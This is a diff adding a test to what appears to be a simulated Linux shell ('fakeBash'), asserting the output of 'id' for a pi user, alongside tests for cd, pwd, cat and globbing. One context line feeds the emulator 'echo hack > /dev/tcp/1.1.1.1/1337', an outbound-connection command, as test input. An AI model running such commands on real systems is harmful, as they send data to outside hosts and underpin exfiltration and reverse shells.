@@ -338,6 +338,8 @@ assert.equal(fakeBash('echo hack > /dev/tcp/1.1.1.1/1337'), '-bash: connect: Con
 assert.equal(fakeBash('cd $HOME'), '')
 assert.equal(fakeBash('pwd'), '/home/pi')
 
+assert.equal(fakeBash('id'), 'uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),105(input),109(netdev),117(lpadmin),994(docker),995(nordvpn),997(gpio),998(i2c),999(spi)')
+
 assert.equal(fakeBash('cat /'), 'cat: /: Is a directory')
 assert.equal(fakeBash('cat /usr'), 'cat: /usr: Is a directory')
 assert.equal(bashGlob('/*'), '/bin /boot /dev /etc /home /lib /lib64 /lost+found /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var')
